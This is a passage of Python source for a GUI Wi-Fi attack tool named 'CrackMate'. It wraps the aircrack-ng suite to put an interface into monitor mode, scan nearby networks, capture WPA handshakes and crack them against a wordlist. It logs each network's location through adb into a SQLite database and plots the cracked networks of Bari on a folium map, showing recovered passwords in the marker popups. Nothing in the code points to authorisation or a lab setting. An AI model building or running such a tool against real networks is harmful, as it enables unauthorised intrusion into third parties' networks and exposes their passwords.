    except subprocess.CalledProcessError as e: log_to_gui(f"ADB Error (dumpsys): {e.stderr or e.stdout or e}")
    except subprocess.TimeoutExpired: log_to_gui("ADB command 'dumpsys location' timed out.")
    except FileNotFoundError: log_to_gui("Error: 'adb' command not found.")
    except Exception as e: log_to_gui(f"Unexpected error retrieving ADB location: {e}")
    main_queue.put(("location_result", (lat, lon)))

def save_scan_data_task(networks_to_save, lat, lon):
    num_networks = len(networks_to_save)
    log_to_gui(f"\nSaving {num_networks} network{'s' if num_networks != 1 else ''} to {WIFI_DB_FILE}...")
    if not networks_to_save:
        main_queue.put(("save_result", (False, "No data to save"))); return

    conn = None
    try:
        conn = sqlite3.connect(WIFI_DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS networks (
                bssid TEXT PRIMARY KEY, ssid TEXT, power INTEGER, channel TEXT, encryption TEXT,
                latitude REAL, longitude REAL, last_seen TEXT,
                handshake_captured INTEGER DEFAULT 0,
                password TEXT DEFAULT NULL,
                handshake_filepath TEXT DEFAULT NULL ) ''')
        conn.commit()

        saved_or_updated_count = 0
        current_timestamp = datetime.now().isoformat()

        for net_data in networks_to_save:
            if not isinstance(net_data, dict): continue
            bssid = net_data.get("bssid")
            if not bssid: continue

            current_lat_for_db, current_lon_for_db = None, None
            if lat is not None:
                try: current_lat_for_db = float(lat)
                except (ValueError, TypeError): pass
            if lon is not None:
                try: current_lon_for_db = float(lon)
                except (ValueError, TypeError): pass

            val_ssid = net_data.get("ssid")
            val_power = net_data.get("power")
            val_channel = str(net_data.get("channel", "")) if net_data.get("channel") is not None else None
            val_encryption = net_data.get("encryption")
            val_hs_captured = net_data.get("handshake_captured")
            val_password = net_data.get("password")
            val_hs_filepath = net_data.get("handshake_filepath")

            try:
                cursor.execute('''
                    INSERT INTO networks (bssid, ssid, power, channel, encryption, latitude, longitude, last_seen,
                                          handshake_captured, password, handshake_filepath)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ON CONFLICT(bssid) DO UPDATE SET
                        ssid = COALESCE(excluded.ssid, networks.ssid),
                        power = COALESCE(excluded.power, networks.power),
                        channel = COALESCE(excluded.channel, networks.channel),
                        encryption = COALESCE(excluded.encryption, networks.encryption),
                        latitude = COALESCE(excluded.latitude, networks.latitude),
                        longitude = COALESCE(excluded.longitude, networks.longitude),
                        last_seen = excluded.last_seen,
                        handshake_captured = CASE
                            WHEN excluded.handshake_captured = 1 THEN 1
                            ELSE networks.handshake_captured
                        END,
                        password = COALESCE(excluded.password, networks.password),
                        handshake_filepath = COALESCE(excluded.handshake_filepath, networks.handshake_filepath)
                    WHERE
                        -- Only update if the new data is more complete or newer
                        (excluded.password IS NOT NULL AND networks.password IS NULL) OR
                        (excluded.handshake_captured = 1 AND networks.handshake_captured = 0) OR
                        (excluded.latitude IS NOT NULL AND networks.latitude IS NULL) OR
                        (excluded.ssid IS NOT NULL AND networks.ssid IS NULL) OR
                        excluded.last_seen >= networks.last_seen
                ''', (bssid, val_ssid, val_power, val_channel, val_encryption,
                      current_lat_for_db, current_lon_for_db, current_timestamp,
                      val_hs_captured, val_password, val_hs_filepath))

                # If the insert or update happened, increment count
                if cursor.rowcount > 0: saved_or_updated_count +=1

            except sqlite3.Error as e_sql: log_to_gui(f"SQLite error saving {bssid}: {e_sql}")
            except Exception as e_item: log_to_gui(f"Error preparing data for {bssid}: {e_item}")
        conn.commit()
        log_to_gui(f"{saved_or_updated_count} network records saved/updated in {WIFI_DB_FILE}")
        main_queue.put(("save_result", (True, f"{saved_or_updated_count} saved/updated")))
        if saved_or_updated_count > 0:
            main_queue.put(("trigger_map_regeneration", None))
    except sqlite3.Error as e:
        log_to_gui(f"Database Error: {e} while saving to {WIFI_DB_FILE}")
        main_queue.put(("save_result", (False, str(e))))
    except Exception as e_gen:
        log_to_gui(f"General Data Saving Error: {e_gen}"); traceback.print_exc()
        main_queue.put(("save_result", (False, str(e_gen))))
    finally:
        if conn: conn.close()

def update_and_generate_map_task():
    log_to_gui("\n--- Updating Cracked WiFi Map for Bari ---")

    if not check_command("folium"):
        main_queue.put(("map_update_finished", False))
        return

    # Chiamata a ensure_db_exists() all'inizio
    if not ensure_db_exists():
        log_to_gui(f"Map generation failed because database '{os.path.basename(WIFI_DB_FILE)}' could not be ensured/created.")
        main_queue.put(("map_update_finished", False))
        return

    conn = None  # Inizializza conn fuori dal blocco try per assicurare la sua disponibilità in finally
    try:
        conn = sqlite3.connect(WIFI_DB_FILE)
        query = """
            SELECT bssid, ssid, latitude, longitude, password, handshake_filepath, encryption
            FROM networks
            WHERE (password IS NOT NULL OR handshake_filepath IS NOT NULL OR handshake_captured = 1)
              AND latitude IS NOT NULL AND longitude IS NOT NULL """
        df = pd.read_sql_query(query, conn)

        # Crea sempre la mappa base
        bari_map = folium.Map(location=BARI_COORDINATES, zoom_start=13, tiles="CartoDB positron")

        if df.empty:
            log_to_gui(f"No geolocated networks with crack attempts/captures in '{WIFI_DB_FILE}' for Bari map.")
            # Salva comunque la mappa (vuota o con solo il centro di Bari se vuoi reintrodurlo)
            bari_map.save(MAP_FILE_NAME)
            log_to_gui(f"Bari map saved (empty or base): {os.path.abspath(MAP_FILE_NAME)}")
            main_queue.put(("map_update_finished", True)) # Mappa generata con successo (anche se vuota)
            return

        # Procedi se df non è vuoto
        df.columns = [c.lower() for c in df.columns] # Normalizza nomi colonne
        df['latitude'] = pd.to_numeric(df['latitude'], errors='coerce')
        df['longitude'] = pd.to_numeric(df['longitude'], errors='coerce')
        df.dropna(subset=["latitude", "longitude", "bssid"], inplace=True) # Rimuovi righe con coordinate o bssid mancanti

        if df.empty: # Controlla di nuovo dopo la pulizia
            log_to_gui("No valid geolocated networks after cleaning for Bari map.")
            bari_map.save(MAP_FILE_NAME) # Salva la mappa base
            log_to_gui(f"Bari map saved (no valid points after cleaning): {os.path.abspath(MAP_FILE_NAME)}")
            main_queue.put(("map_update_finished", True))
            return
        else:
            # Usa la funzione globale update_gui_status per aggiornare la barra di stato
            update_gui_status("Updating Bari cracked map with new data...")

        points_added = 0
        for _, row in df.iterrows():
            try:
                lat, lon = row["latitude"], row["longitude"]
                bssid, ssid_val = str(row["bssid"]), str(row.get("ssid", "N/A"))
                pwd = row.get("password") # Potrebbe essere None
                enc = row.get("encryption", "N/A") # Potrebbe essere None

                popup_html = f"<b>SSID:</b> {ssid_val}<br>" \
                             f"<b>BSSID:</b> {bssid}<br>" \
                             f"<b>Encryption:</b> {enc}<br>"
                tooltip_text = f"{ssid_val} ({bssid})"
                marker_color = "red" # Colore di default per tentativi falliti/in corso

                if pwd: # Password trovata
                    marker_color = "green"
                    popup_html += f"<b>Password: <font color='green' style='font-weight:bold;'>{pwd}</font></b>"
                    tooltip_text += " (Cracked - Success)"
                # Se password è None ma handshake_filepath esiste o handshake_captured è 1
                # (implicitamente vero dalla query SQL se password è null ma la riga è selezionata)
                elif row.get("handshake_filepath") or row.get("handshake_captured"):
                    popup_html += "<i>Status: Handshake Captured (Crack Pending/Failed)</i>"
                    tooltip_text += " (Attempted - Failed/Pending)"
                else: # Caso fallback, non dovrebbe succedere con la query attuale
                    popup_html += "<i>Status: Geolocation known, no crack attempt data</i>"
                    tooltip_text += " (Known Location)"
                    # Potresti usare un colore diverso, es. 'blue' o 'gray'
                    marker_color = "blue"


                folium.Marker(
                    [lat, lon],
                    popup=folium.Popup(popup_html, max_width=300),
                    icon=folium.Icon(color=marker_color, icon='wifi', prefix='fa'), # 'fa' per Font Awesome icons
                    tooltip=tooltip_text
                ).add_to(bari_map)
                points_added += 1
            except Exception as e_marker:
                log_to_gui(f"Map marker error for BSSID {row.get('bssid','N/A')}: {e_marker}")

        if points_added == 0 and not df.empty: # df aveva dati, ma nessun punto è stato aggiunto (es. tutti errori marker)
             log_to_gui("Data found for map, but no points were plotted successfully. Check marker logic or data errors.")
        elif points_added > 0:
             log_to_gui(f"Added {points_added} networks to Bari map.")
        # Se points_added è 0 perché df era vuoto dopo la pulizia, è già stato gestito.

        bari_map.save(MAP_FILE_NAME)
        log_to_gui(f"Bari map updated/saved: {os.path.abspath(MAP_FILE_NAME)}")
        main_queue.put(("map_update_finished", True)) # Successo

    except pd.errors.EmptyDataError:
        log_to_gui(f"No data returned from SQL query for map. DB table '{WIFI_DB_FILE}' might be empty or query needs adjustment.")
        # Puoi decidere se salvare una mappa vuota qui o considerare un fallimento
        # Per coerenza, salviamo una mappa vuota se la query non dà risultati
        try:
            if 'bari_map' not in locals(): # Se bari_map non è stato creato a causa di un errore precedente
                 bari_map = folium.Map(location=BARI_COORDINATES, zoom_start=13, tiles="CartoDB positron")
            bari_map.save(MAP_FILE_NAME)
            log_to_gui(f"Bari map saved (empty due to no SQL data): {os.path.abspath(MAP_FILE_NAME)}")
            main_queue.put(("map_update_finished", True))
        except Exception as e_save_empty:
            log_to_gui(f"Error saving empty map after SQL EmptyDataError: {e_save_empty}")
            main_queue.put(("map_update_finished", False))
    except sqlite3.Error as e_sql:
        log_to_gui(f"SQLite error during map data retrieval: {e_sql}")
        main_queue.put(("map_update_finished", False))
    except Exception as e:
        log_to_gui(f"General Bari map update error: {e}")
        traceback.print_exc() # Stampa il traceback completo per debug
        main_queue.put(("map_update_finished", False))
    finally:
        if conn:
            conn.close()

# --- GUI Application Class ---
class WifiToolApp(tk.Tk):
    def __init__(self):
        super().__init__(); self.title("CrackMate"); self.geometry("850x750")
        self.configure(background='white') # Main Tk window background
        self.window_icon_tk = None; self.app_logo_tk = None
        if WINDOW_ICON_PATH and os.path.exists(WINDOW_ICON_PATH):
            try: self.window_icon_tk = tk.PhotoImage(file=WINDOW_ICON_PATH); self.iconphoto(True, self.window_icon_tk)
            except tk.TclError: log_to_gui("Warning: Could not load window icon (try PNG).")

        style = ttk.Style(self)
        # --- STYLE CONFIGURATION TO REVERT TO WHITE BACKGROUNDS FOR TTK WIDGETS ---
        style.configure(".", background="white", foreground="black", relief="flat")
        style.configure("TFrame", background="white")
        style.configure("TLabel", background="white", foreground="black")
        style.configure("TLabelframe", background="white", bordercolor="lightgrey") # Lighter border
        style.configure("TLabelframe.Label", background="white", foreground="black")
        style.configure("TButton", foreground="black", background="#f0f0f0", relief="raised", padding=3) # Light grey button
        style.map("TButton", background=[('active', '#e0e0e0')]) # Slightly darker when active
        style.configure("Treeview", background="white", fieldbackground="white", foreground="black")
        style.configure("Treeview.Heading", background="#e8e8e8", foreground="black", relief="flat", font=('Helvetica', 9, 'bold')) # Light grey heading
        style.configure("TNotebook", background="white", tabmargins=[2, 5, 2, 0])
        style.configure("TNotebook.Tab", background="#e0e0e0", foreground="black", padding=[8, 2], relief="raised") # Light grey inactive tab
        style.map("TNotebook.Tab",
                  background=[("selected", "white"), ('active', '#f0f0f0')], # White selected, lighter grey active
                  relief=[("selected", "flat"), ("active", "raised")])
        style.configure("TEntry", fieldbackground="white", foreground="black", background="white")
        style.configure("TCombobox", fieldbackground="white", foreground="black", background="white", arrowcolor="black")
        style.map("TCombobox",
                  fieldbackground=[('readonly', 'white'), ('disabled', '#f0f0f0')],
                  foreground=[('readonly', 'black'), ('disabled', 'grey')])
        style.configure("TScrollbar", background="#f0f0f0", troughcolor="white", bordercolor="#d0d0d0", arrowcolor="black")
        style.map("TScrollbar", background=[('active', '#d0d0d0')])
        # --- END OF STYLE CONFIGURATION ---

        if os.geteuid()!=0: messagebox.showwarning("Permissions","Run with 'sudo' for full functionality.")
        essential_cmds=["sudo","ip","iw","airmon-ng","airodump-ng","aireplay-ng","aircrack-ng", "folium"]
        missing_cmds=[cmd for cmd in essential_cmds if not check_command(cmd)];
        if missing_cmds:
            is_only_folium_missing = len(missing_cmds) == 1 and missing_cmds[0] == "folium"
            if not is_only_folium_missing :
                messagebox.showerror("Dependencies Missing", f"Essential tools missing: {', '.join(missing_cmds)}\nPlease install them.")
        create_dirs()

        self.monitor_interface=None; self.current_scan_results=[]; self.selected_wordlist=tk.StringVar(value=WORDLIST)
        self.latitude=None; self.longitude=None; self.network_item_map={}; self.handshake_item_map={}
        self.network_pending_db_save = None; self.map_generation_in_progress = False
        self.pending_monitor_start_iface = None

        self.notebook=ttk.Notebook(self)
        self.tab_scan=ttk.Frame(self.notebook,padding=10); self.notebook.add(self.tab_scan,text=' Scan & Capture '); self.create_scan_tab()
        self.tab_crack=ttk.Frame(self.notebook,padding=10); self.notebook.add(self.tab_crack,text=' Crack Handshake '); self.create_crack_tab()
        self.notebook.pack(expand=True,fill='both',padx=5,pady=5)

        log_frame=ttk.LabelFrame(self,text="Log",padding=5)
        log_frame.pack(expand=True,fill='both', padx=5, pady=(0,0))
        self.log_area=scrolledtext.ScrolledText(log_frame,height=8,wrap=tk.WORD,state='disabled',font=("monospace", 9))
        self.log_area.pack(expand=True,fill='both',padx=5,pady=5);
        self.log_area.tag_config("ERROR",foreground="red"); self.log_area.tag_config("WARNING",foreground="orange")
        self.log_area.tag_config("SUCCESS",foreground="green"); self.log_area.tag_config("INFO",foreground="blue")

        self.status_var=tk.StringVar();
        self.status_bar=ttk.Label(self,textvariable=self.status_var,relief=tk.SUNKEN,anchor=tk.W,padding=(5,2))
        self.status_bar.pack(side=tk.BOTTOM,fill=tk.X, pady=(2,0)); self.status_var.set("Ready. Sudo execution recommended.")

        self.after(100,self.process_queue); self.protocol("WM_DELETE_WINDOW",self.on_closing)
        self.refresh_interfaces(); self.refresh_handshake_list()
        self.trigger_map_update()

    def log_message(self, message, level="NORMAL"):
        try:
            self.log_area.config(state='normal'); tag=();
            str_message = str(message); str_level = str(level).upper()
            if any(s in str_level or s in str_message.upper() for s in ["ERROR","FAIL"]): tag=("ERROR",)
            elif any(s in str_level or s in str_message.upper() for s in ["WARNING","WARN"]): tag=("WARNING",)
            elif any(s in str_level or s in str_message.upper() for s in ["SUCCESS","FOUND","CAPTURED"]): tag=("SUCCESS",)
            elif any(s in str_message for s in ["Executing","---","Attempting","Starting"]): tag=("INFO",)
            self.log_area.insert(tk.END, str_message+'\n', tag);
            self.log_area.config(state='disabled'); self.log_area.see(tk.END)
        except Exception as e: print(f"CONSOLE LOG ERROR: {e}\nOriginal msg: {message}")

    def update_status(self, message): self.status_var.set(message)

    def process_queue(self):
        try:
            while True:
                msg_type, data = main_queue.get_nowait()
                try:
                    # --- FIXED: Call log_message instead of handle_log ---
                    if msg_type == "log": self.log_message(data)
                    elif msg_type == "status": self.update_status(data) # Use direct call for status
                    elif msg_type == "trigger_map_regeneration": self.trigger_map_update()
                    elif msg_type == "map_update_finished": self.handle_map_update_finished(data)
                    elif msg_type == "set_pending_monitor_start": self.pending_monitor_start_iface = data
                    else:
                        handler = getattr(self, f"handle_{msg_type}", None)
                        if handler: handler(data)
                        else: print(f"CONSOLE: No GUI handler for unexpected msg type '{msg_type}'")
                except Exception as e_h: print(f"CONSOLE: Handler exc for '{msg_type}': {e_h}"); traceback.print_exc()
                finally: self.update_idletasks() # Ensure GUI updates happen
        except queue.Empty: pass
        except Exception as e_q: print(f"CONSOLE: Error in process_queue main loop: {e_q}"); traceback.print_exc()
        finally: self.after(100, self.process_queue) # Reschedule after delay


    def create_scan_tab(self):
        f1=ttk.Frame(self.tab_scan); f1.pack(pady=5,fill=tk.X);
        ttk.Label(f1,text="Interface:").pack(side=tk.LEFT,padx=(0,5))
        self.interface_combo=ttk.Combobox(f1,state="readonly",width=15); self.interface_combo.pack(side=tk.LEFT,padx=5)
        self.refresh_interfaces_button=ttk.Button(f1,text="Refresh",command=self.refresh_interfaces); self.refresh_interfaces_button.pack(side=tk.LEFT,padx=5)
        self.monitor_start_button=ttk.Button(f1,text="▶ Start Mon",command=self.start_monitor_mode); self.monitor_start_button.pack(side=tk.LEFT,padx=10)

        if APP_LOGO_PATH and os.path.exists(APP_LOGO_PATH):
            try:
                img_pil = Image.open(APP_LOGO_PATH)
                logo_height = 128
                img_ratio = img_pil.width / img_pil.height
                logo_width = int(logo_height * img_ratio)
                img_pil_resized = img_pil.resize((logo_width, logo_height), Image.Resampling.LANCZOS)
                self.app_logo_tk = ImageTk.PhotoImage(img_pil_resized)
                ttk.Label(f1, image=self.app_logo_tk, background="white").pack(side=tk.LEFT, padx=20, anchor='w')
            except Exception as e_logo: log_to_gui(f"App logo load error: {e_logo}")

        f2=ttk.Frame(self.tab_scan); f2.pack(pady=5,fill=tk.X)
        self.scan_button=ttk.Button(f2,text="📡 Scan",command=self.start_scan,state=tk.DISABLED); self.scan_button.pack(side=tk.LEFT,padx=0)
        self.stop_scan_button=ttk.Button(f2,text="Stop Scan",command=self.stop_scan,state=tk.DISABLED); self.stop_scan_button.pack(side=tk.LEFT,padx=10)

        lf=ttk.LabelFrame(self.tab_scan,text="Scanned Networks",padding=5); lf.pack(expand=True,fill="both",pady=5)
        cols=("SSID","BSSID","Pwr","Ch","Encryption","Cli","HS"); self.network_tree=ttk.Treeview(lf,columns=cols,show="headings",selectmode="extended")
        for c in cols: self.network_tree.heading(c,text=c,anchor=tk.W)
        w={"SSID":160,"BSSID":140,"Pwr":50,"Ch":40,"Encryption":180,"Cli":60,"HS":70}; a={"Pwr":"center","Ch":"center","Cli":"center","HS":"center"}
        for c in cols: self.network_tree.column(c, width=w[c], anchor=a.get(c,tk.W), stretch=tk.YES if c in ["SSID","Encryption"] else tk.NO)
        vsb=ttk.Scrollbar(lf,orient="vertical",command=self.network_tree.yview); hsb=ttk.Scrollbar(lf,orient="horizontal",command=self.network_tree.xview)
        self.network_tree.config(yscrollcommand=vsb.set,xscrollcommand=hsb.set); vsb.pack(side="right",fill="y"); hsb.pack(side="bottom",fill="x"); self.network_tree.pack(expand=True,fill="both")

        f3=ttk.Frame(self.tab_scan); f3.pack(pady=5,fill=tk.X)
        self.check_clients_button=ttk.Button(f3,text="Check Cli",command=self.check_selected_clients,state=tk.DISABLED); self.check_clients_button.pack(side=tk.LEFT,padx=(0,5))
        self.capture_button=ttk.Button(f3,text="Capture HS",command=self.capture_selected_handshakes,state=tk.DISABLED); self.capture_button.pack(side=tk.LEFT,padx=5)
        self.stop_capture_button=ttk.Button(f3,text="Stop Capture",command=self.stop_capture,state=tk.DISABLED); self.stop_capture_button.pack(side=tk.LEFT,padx=5)
        spacer = ttk.Frame(f3); spacer.pack(side=tk.LEFT, expand=True, fill=tk.X)
        # --- REMOVED SAVE BUTTON ---


    def create_crack_tab(self):
        f1=ttk.Frame(self.tab_crack); f1.pack(pady=10,fill=tk.X); ttk.Label(f1,text="Wordlist:").pack(side=tk.LEFT,padx=(0,5))
        self.wordlist_entry=ttk.Entry(f1,textvariable=self.selected_wordlist,width=50); self.wordlist_entry.pack(side=tk.LEFT,padx=5,fill=tk.X,expand=True)
        self.browse_wordlist_button=ttk.Button(f1,text="Browse...",command=self.browse_wordlist); self.browse_wordlist_button.pack(side=tk.LEFT,padx=5)

        lf=ttk.LabelFrame(self.tab_crack,text="Captured Handshakes (.cap)",padding=5); lf.pack(expand=True,fill="both",pady=5)
        cols=("Filename","SSID","BSSID","Status"); self.handshake_tree=ttk.Treeview(lf,columns=cols,show="headings",selectmode="extended")
        for c in cols: self.handshake_tree.heading(c,text=c,anchor=tk.W)
        w={"Filename":250,"SSID":150,"BSSID":140,"Status":160}; s={"Filename":tk.YES,"SSID":tk.YES,"BSSID":tk.NO,"Status":tk.NO}
        for c in cols: self.handshake_tree.column(c,width=w[c],anchor=tk.W,stretch=s[c])
        vsb=ttk.Scrollbar(lf,orient="vertical",command=self.handshake_tree.yview); hsb=ttk.Scrollbar(lf,orient="horizontal",command=self.handshake_tree.xview)
        self.handshake_tree.config(yscrollcommand=vsb.set,xscrollcommand=hsb.set); vsb.pack(side="right",fill="y"); hsb.pack(side="bottom",fill="x"); self.handshake_tree.pack(expand=True,fill="both")

        f2=ttk.Frame(self.tab_crack); f2.pack(pady=10,fill=tk.X)
        self.refresh_handshakes_button=ttk.Button(f2,text="Refresh List",command=self.refresh_handshake_list); self.refresh_handshakes_button.pack(side=tk.LEFT,padx=0)
        self.crack_button=ttk.Button(f2,text="Crack Selected",command=self.crack_selected_handshakes,state=tk.DISABLED); self.crack_button.pack(side=tk.LEFT,padx=10)
        self.stop_crack_button=ttk.Button(f2,text="Stop Cracking (Sel)",command=self.stop_selected_cracking,state=tk.DISABLED); self.stop_crack_button.pack(side=tk.LEFT,padx=5)
        self.open_map_button = ttk.Button(f2, text="🌍 Open Updated Map", command=self.open_updated_map_from_crack_tab)
        self.open_map_button.pack(side=tk.LEFT, padx=15)

    def refresh_interfaces(self):
        self.update_status("Refreshing interfaces..."); self.interface_combo['values']=[]; self.interface_combo.set('')
        interfaces=get_interfaces();
        if interfaces:
            f_interfaces=[i for i in interfaces if i!=self.monitor_interface]
            if not f_interfaces and self.monitor_interface: self.interface_combo['values']=[self.monitor_interface]; self.interface_combo.set(self.monitor_interface)
            elif f_interfaces: self.interface_combo['values']=f_interfaces; self.interface_combo.current(0)
            else: self.interface_combo.set('')
            self.update_status("Interfaces refreshed.")
        else: log_to_gui("No suitable wireless interfaces found."); self.update_status("No interfaces found.")
        self.monitor_start_button.config(state=tk.NORMAL if not self.monitor_interface and self.interface_combo.get() else tk.DISABLED)

    def start_monitor_mode(self):
        iface=self.interface_combo.get()
        if not iface: messagebox.showerror("Error","Select an interface."); return
        if self.monitor_interface:
            if messagebox.askyesno("Monitor Active", f"Monitor mode on {self.monitor_interface}.\nStop it and start on {iface}?"):
                self.stop_monitor_mode(callback_iface_to_start=iface)
            return
        self.update_status(f"Starting monitor mode on {iface}...");
        self.monitor_start_button.config(state=tk.DISABLED); self.refresh_interfaces_button.config(state=tk.DISABLED); self.interface_combo.config(state=tk.DISABLED)
        threading.Thread(target=monitor_mode_task,args=(iface,),daemon=True).start()

    def stop_monitor_mode(self, callback_iface_to_start=None):
        if not self.monitor_interface:
            if callback_iface_to_start:
                log_to_gui(f"No active monitor. Attempting to start on {callback_iface_to_start}.")
                self.interface_combo.set(callback_iface_to_start)
                self.start_monitor_mode()
            return
        self.update_status(f"Stopping monitor mode on {self.monitor_interface}...");
        if scan_process_obj and scan_process_obj.poll() is None: self.stop_scan()
        if capture_process_obj and capture_process_obj.poll() is None: self.stop_capture()
        main_queue.put(("set_pending_monitor_start", callback_iface_to_start))
        threading.Thread(target=stop_monitor_mode_task,args=(self.monitor_interface,),daemon=True).start()

    def start_scan(self):
        if not self.monitor_interface: messagebox.showerror("Error","Monitor mode must be active."); return
        if scan_process_obj and scan_process_obj.poll() is None: messagebox.showwarning("Busy","Scan in progress."); return
        self.update_status(f"Starting scan on {self.monitor_interface}...");
        self.scan_button.config(state=tk.DISABLED); self.stop_scan_button.config(state=tk.NORMAL);
        self.network_tree.delete(*self.network_tree.get_children()); self.network_item_map.clear(); self.current_scan_results=[]
        # --- REMOVED SAVE BUTTON from state management ---
        for btn in [self.check_clients_button,self.capture_button]: btn.config(state=tk.DISABLED)
        threading.Thread(target=scan_wifi_networks_task,args=(self.monitor_interface,30),daemon=True).start()

    def stop_scan(self):
        global scan_process_obj
        if scan_process_obj and scan_process_obj.poll() is None:
            terminate_process(scan_process_obj,"Network Scan"); scan_process_obj=None; self.update_status("Network scan stopped.")
        self.stop_scan_button.config(state=tk.DISABLED);
        if self.monitor_interface: self.scan_button.config(state=tk.NORMAL)

    def check_selected_clients(self):
        if not self.monitor_interface: messagebox.showerror("Error","Monitor mode must be active."); return
        selected_ids=self.network_tree.selection();
        if not selected_ids: messagebox.showinfo("Info","Select network(s)."); return
        count=0
        for item_id in selected_ids:
            vals=self.network_tree.item(item_id,'values');
            if len(vals)>=4 and vals[1] and str(vals[3]).strip().isdigit():
                self.network_tree.set(item_id,"Cli","Chk...");
                threading.Thread(target=check_for_clients_task,args=(self.monitor_interface,vals[1],int(str(vals[3]).strip())),daemon=True).start(); count+=1
            else: self.network_tree.set(item_id,"Cli","InvData")
        if count==0: self.update_status("No valid networks for client check.")

    def capture_selected_handshakes(self):
        global capture_process_obj
        if capture_process_obj and capture_process_obj.poll() is None: messagebox.showwarning("Busy","Capture in progress."); return
        if not self.monitor_interface: messagebox.showerror("Error","Monitor mode must be active."); return
        selected_ids = self.network_tree.selection()
        if not selected_ids or len(selected_ids) > 1: messagebox.showinfo("Info","Select ONE network."); return
        item_id = selected_ids[0]; vals = self.network_tree.item(item_id, 'values')
        if len(vals) < 5 or not str(vals[3]).strip().isdigit(): messagebox.showerror("Error", "Incomplete/invalid network data."); return

        ssid, bssid, channel_str, enc = vals[0], vals[1], str(vals[3]).strip(), vals[4]
        if "WPA" not in enc.upper() and not messagebox.askyesno("Confirm", f"{ssid} ({enc}) may not be WPA. Capture anyway?"): return

        self.update_status(f"Capturing for {ssid}..."); self.capture_button.config(state=tk.DISABLED); self.stop_capture_button.config(state=tk.NORMAL)
        for btn in [self.scan_button, self.check_clients_button]: btn.config(state=tk.DISABLED)
        self.network_tree.set(item_id, "HS", "Cap...")
        threading.Thread(target=capture_handshake_task, args=(self.monitor_interface, bssid, int(channel_str), ssid), daemon=True).start()

    def stop_capture(self):
        global capture_process_obj
        if capture_process_obj and capture_process_obj.poll() is None:
            terminate_process(capture_process_obj,"Handshake Capture"); capture_process_obj=None; self.update_status("Capture stopped.")
        self.stop_capture_button.config(state=tk.DISABLED);
        if self.monitor_interface:
            for btn in [self.capture_button, self.check_clients_button, self.scan_button]: btn.config(state=tk.NORMAL)

    # --- REMOVED save_scan_data METHOD (triggered by removed button) ---

    def browse_wordlist(self):
        path=filedialog.askopenfilename(title="Select Wordlist", filetypes=(("Text files", "*.txt"),("All files", "*.*")))
        if path: self.selected_wordlist.set(path); log_to_gui(f"Wordlist: {path}")

    def refresh_handshake_list(self):
        self.update_status("Refreshing handshake list...");
        self.crack_button.config(state=tk.DISABLED); self.stop_crack_button.config(state=tk.DISABLED);
        threading.Thread(target=self.load_handshake_files_task,daemon=True).start()

    def load_handshake_files_task(self):
        hs_data_list=[];
        try:
            if not os.path.isdir(HANDSHAKE_DIR): main_queue.put(("handshake_files_loaded",[])); return
            cap_files=sorted(glob.glob(os.path.join(HANDSHAKE_DIR,"*.cap")),key=os.path.getmtime,reverse=True)
            for fp in cap_files:
                fn=os.path.basename(fp)
                bssid_m=re.search(r'(([0-9A-Fa-f]{2}[-:]){5}[0-9A-Fa-f]{2})',fn)
                bssid_s = bssid_m.group(1).replace('-',':').upper() if bssid_m else "N/A"
                ssid_m = re.match(r'^(.*?)[_-](?:([0-9A-Fa-f]{2}[-:]){5}[0-9A-Fa-f]{2})', fn)
                ssid_s = ssid_m.group(1).replace('_',' ').strip() if ssid_m and ssid_m.group(1) else "UnknownSSID"
                if ssid_s.lower() == "handshake": ssid_s = "UnknownSSID"
                if not ssid_s or ssid_s == "UnknownSSID":
                     base_name_no_ext = os.path.splitext(fn)[0]
                     if bssid_s != "N/A": base_name_no_ext = base_name_no_ext.replace(bssid_s.replace(':','-'),'').replace(bssid_s.replace(':',''),'')
                     ssid_s = base_name_no_ext.replace('handshake','').replace('_',' ').strip() or "UnknownSSID"

                status="Ready"
                if bssid_s!="N/A":
                    cr_fp = os.path.join(CRACKED_DIR,f"cracked_{bssid_s.replace(':','-')}.txt")
                    if os.path.exists(cr_fp) and os.path.getsize(cr_fp)>0:
                        with open(cr_fp,'r', encoding='utf-8') as f_pwd: pwd=f_pwd.read().strip(); status=f"FOUND: {pwd}" if pwd else "Cracked (Empty)"
                    elif bssid_s in crack_processes and crack_processes[bssid_s].poll() is None: status="Cracking..."
                hs_data_list.append({"filepath":fp, "filename":fn, "ssid":ssid_s, "bssid":bssid_s, "status":status})
            main_queue.put(("handshake_files_loaded",hs_data_list))
        except Exception as e: log_to_gui(f"Load HS files error: {e}"); main_queue.put(("handshake_files_loaded",[]))

    def crack_selected_handshakes(self):
        selected_iids=self.handshake_tree.selection();
        if not selected_iids: messagebox.showinfo("Info","Select handshake file(s)."); return
        wordlist=self.selected_wordlist.get()
        if not os.path.exists(wordlist) or not os.path.isfile(wordlist): messagebox.showerror("Error",f"Invalid wordlist: {wordlist}"); return

        self.update_status("Preparing to crack..."); self.crack_button.config(state=tk.DISABLED); self.refresh_handshakes_button.config(state=tk.DISABLED);
        queued=0
        for iid in selected_iids:
            data = self.handshake_item_map.get(iid); # Use iid (filepath) as key
            if not data or data["bssid"]=="N/A" or "FOUND:" in data["status"] or "Cracking..." in data["status"]: continue
            if os.path.exists(data["filepath"]):
                self.handshake_tree.set(iid,"Status","Cracking..."); data["status"]="Cracking...";
                threading.Thread(target=crack_handshake_task,args=(data["bssid"],data["ssid"],data["filepath"],wordlist),daemon=True).start(); queued+=1
            else: self.handshake_tree.set(iid,"Status","File Missing"); data["status"]="File Missing"
        if queued > 0: self.stop_crack_button.config(state=tk.NORMAL); self.update_status(f"Queued {queued} for cracking.")
        else:
            self.update_status("No new valid handshakes queued.");
            self.crack_button.config(state=tk.NORMAL if self.handshake_item_map else tk.DISABLED);
            self.refresh_handshakes_button.config(state=tk.NORMAL)

    def stop_selected_cracking(self):
        selected_iids=self.handshake_tree.selection();
        if not selected_iids: messagebox.showinfo("Info","Select cracking task(s) to stop."); return
        stopped=0
        for iid in selected_iids:
            data=self.handshake_item_map.get(iid); # Use iid (filepath) as key
            if not data or data["bssid"] not in crack_processes: continue
            proc = crack_processes[data["bssid"]]
            if proc and proc.poll() is None:
                terminate_process(proc,f"Cracking ({data['bssid']})");
                self.handshake_tree.set(iid,"Status","Stopping..."); data["status"]="Stopping..."; stopped+=1
            elif data["bssid"] in crack_processes: del crack_processes[data["bssid"]]
        if stopped > 0: self.update_status(f"Attempted stop for {stopped} tasks.")
        else: self.update_status("No running tasks selected to stop.")
        any_cracking = any("Cracking..." in d.get("status", "") or "Stopping..." in d.get("status", "") for d in self.handshake_item_map.values())
